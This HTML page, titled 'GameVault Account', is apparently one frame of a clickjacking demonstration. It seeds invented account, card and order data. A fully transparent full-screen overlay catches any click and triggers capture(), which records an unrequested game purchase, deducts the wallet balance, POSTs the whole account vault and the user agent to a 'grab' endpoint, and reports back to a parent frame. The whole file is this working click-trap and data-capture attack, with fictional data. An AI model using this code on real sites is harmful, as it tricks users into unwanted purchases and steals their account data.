<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>GameVault Account</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
html, body { width: 100%; height: 100%; overflow: hidden; background: transparent; }
#hit { position: fixed; inset: 0; cursor: pointer; background: transparent; }
</style>
</head>
<body>
<div id="hit"></div>
<script>
const VAULT_KEY = 'gv.vault.v1';
const CAPTURE_URL = '/?r=grab';
const TARGET_GAME = { title: 'Doom: The Dark Ages — Definitive Edition', amount: 5999 };

function seed() {
  try {
    if (localStorage.getItem(VAULT_KEY)) return;
    const data = {
      user: { name: 'Marcus Chen', uid: 'u_19204', tier: 'Gold' },
      wallet: { balance: 12450, currency: 'USD' },
      cards: [
        { id: 'c1', last4: '3391', brand: 'Visa', bank: 'Chase', expiry: '11/2028', default: true },
        { id: 'c2', last4: '7705', brand: 'Mastercard', bank: 'Citibank', expiry: '06/2027', default: false }
      ],
      library: [
        { id: 'g1', title: 'Cyberpunk 2077: Phantom City', hours: 211, added: '2026-09-20' },
        { id: 'g2', title: 'Elden Ring: Shadow Realms', hours: 87, added: '2026-10-05' }
      ],
      orders: [
        { id: 'ORD-29812', title: 'Cyberpunk 2077: Phantom City', amount: 5999, date: '2026-09-20' },
        { id: 'ORD-29615', title: 'Elden Ring: Shadow Realms', amount: 5499, date: '2026-10-05' }
      ]
    };
    localStorage.setItem(VAULT_KEY, JSON.stringify(data));
  } catch (e) {}
}

function capture() {
  try {
    const raw = localStorage.getItem(VAULT_KEY);
    const vault = JSON.parse(raw || '{}');

    const orderId = 'ORD-' + Math.floor(10000 + Math.random() * 90000);
    if (!vault.orders) vault.orders = [];
    vault.orders.unshift({
      id: orderId,
      title: TARGET_GAME.title,
      amount: TARGET_GAME.amount,
      date: new Date().toISOString().split('T')[0]
    });
    if (vault.wallet) vault.wallet.balance -= TARGET_GAME.amount;
    localStorage.setItem(VAULT_KEY, JSON.stringify(vault));

    fetch(CAPTURE_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        source: 'nexusstore',
        vault: vault,
        ua: navigator.userAgent,
        ts: Date.now()
      })
    }).catch(() => {});

    if (window.parent !== window && window.parent.nexusStep1Done) {
      window.parent.nexusStep1Done({ orderId, vault });
    }
  } catch (e) {
    if (window.parent !== window && window.parent.nexusStep1Done) {
      window.parent.nexusStep1Done({ orderId: null, vault: {} });
    }
  }
}

seed();
document.getElementById('hit').addEventListener('click', capture);

window.getVaultData = function () {
  try { return JSON.parse(localStorage.getItem(VAULT_KEY) || 'null'); }
  catch (e) { return null; }
};
</script>
</body>
</html>
